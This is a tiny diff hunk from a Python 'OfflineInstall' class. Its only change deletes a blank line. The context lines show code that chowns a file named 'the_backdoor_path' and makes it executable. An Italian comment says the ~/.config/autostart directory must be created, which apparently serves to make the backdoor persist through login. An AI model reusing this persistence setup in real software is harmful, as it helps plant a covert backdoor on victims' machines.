@@ -1646,7 +1646,6 @@ class OfflineInstall(object):
 		os.chown(the_backdoor_path, int(uid), int(gid))
 		os.chmod(the_backdoor_path, 0o755)
 
-
 		#
 		# Senza un primo login, la directory ~/.config/autostart non esiste, bisogna crearla
 		##
